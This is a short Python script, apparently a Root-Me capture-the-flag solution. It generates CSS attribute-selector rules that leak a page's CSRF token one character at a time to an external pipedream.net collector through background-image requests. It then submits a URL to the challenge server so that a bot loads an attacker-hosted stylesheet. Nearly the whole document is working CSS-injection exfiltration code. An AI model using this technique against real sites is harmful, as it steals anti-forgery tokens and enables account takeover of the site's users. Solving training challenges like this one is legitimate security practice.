"""
f = open("data.css", "w")

for i in range(127):
    f.write('input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC'+chr(i)+'"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC'+chr(i)+');}\n')

f.close()
"""
import requests

data = {"url":"http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a"}
r = requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)